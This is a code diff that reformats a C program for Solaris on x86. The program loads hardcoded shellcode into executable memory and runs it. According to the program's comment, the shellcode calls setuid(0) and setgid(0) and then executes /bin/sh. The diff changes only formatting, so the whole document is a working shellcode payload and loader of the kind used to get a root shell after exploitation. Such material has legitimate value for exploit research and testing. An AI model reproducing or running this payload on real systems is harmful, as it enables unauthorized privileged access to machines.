@@ -2,12 +2,12 @@
 #include <string.h>
 
 #if (defined __sun || defined __FreeBSD__)
-# include <strings.h>
+#include <strings.h>
 #endif
 
-#include <unistd.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
+#include <unistd.h>
 
 /*
  * SunOS (Solaris) / x86 setuid(0) + setgid(0) +
@@ -51,64 +51,53 @@
  */
 
 #ifndef unused
-# define unused(x) ((void)(x))
+#define unused(x) ((void)(x))
 #endif
 
-int main(int argc, char **argv)
-{
-	unused(argc);
-	unused(argv);
+int main(int argc, char **argv) {
+  unused(argc);
+  unused(argv);
 
-	struct utsname uts;
-	char *pcall;
-	char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
-                          "\x50\xcd\x91\x56\x56\x33\xc0\xb0"
-                          "\x2e\x50\xcd\x91\x56\x68\x6e\x2f"
-                          "\x73\x68\x68\x2f\x2f\x62\x69\x8b"
-                          "\xdc\x56\x53\x8b\xcc\x56\x56\x51"
-                          "\x53\x33\xc0\xb0\x3b\x50\xcd\x91";
+  struct utsname uts;
+  char *pcall;
+  char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
+                    "\x50\xcd\x91\x56\x56\x33\xc0\xb0"
+                    "\x2e\x50\xcd\x91\x56\x68\x6e\x2f"
+                    "\x73\x68\x68\x2f\x2f\x62\x69\x8b"
+                    "\xdc\x56\x53\x8b\xcc\x56\x56\x51"
+                    "\x53\x33\xc0\xb0\x3b\x50\xcd\x91";
 
-	pcall = mmap(
-		NULL,
-		sysconf(_SC_PAGESIZE),
-		PROT_WRITE | PROT_EXEC,
-		MAP_PRIVATE | MAP_ANONYMOUS,
-		-1,
-		0
-	);
+  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
+               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
-	if (pcall == MAP_FAILED) {
-		perror("mmap()");
-		return -1;
-	}
+  if (pcall == MAP_FAILED) {
+    perror("mmap()");
+    return -1;
+  }
 
-	bzero(&uts, sizeof(struct utsname));
+  bzero(&uts, sizeof(struct utsname));
 
-	if (uname(&uts) < 0) {
-		perror("uname()");
-		munmap(pcall, sysconf(_SC_PAGESIZE));
-		return -1;
-	}
+  if (uname(&uts) < 0) {
+    perror("uname()");
+    munmap(pcall, sysconf(_SC_PAGESIZE));
+    return -1;
+  }
 
-	printf("[*] Machine info\n");
-	printf(" [*] sys: %s\n", uts.sysname);
-	printf(" [*] node: %s\n", uts.nodename);
-	printf(" [*] release: %s\n", uts.release);
-	printf(" [*] version: %s\n", uts.version);
-	printf(" [*] machine: %s\n", uts.machine);
+  printf("[*] Machine info\n");
+  printf(" [*] sys: %s\n", uts.sysname);
+  printf(" [*] node: %s\n", uts.nodename);
+  printf(" [*] release: %s\n", uts.release);
+  printf(" [*] version: %s\n", uts.version);
+  printf(" [*] machine: %s\n", uts.machine);
 
-	printf("[*] Copying shellcode into crafted buffer.\n");
-	memcpy(pcall, shellcode, strlen(shellcode));
+  printf("[*] Copying shellcode into crafted buffer.\n");
+  memcpy(pcall, shellcode, strlen(shellcode));
 
-	printf("[*] Executing the shellcode..\n");
-	__asm__ __volatile__(
-		"call *%%eax\r\n"
-		:
-		: "a"(pcall)
-	);
+  printf("[*] Executing the shellcode..\n");
+  __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
 
-	printf("[*] Cleaning up..\n");
-	munmap(pcall, sysconf(_SC_PAGESIZE));
+  printf("[*] Cleaning up..\n");
+  munmap(pcall, sysconf(_SC_PAGESIZE));
 
-	return 0;
+  return 0;
 }
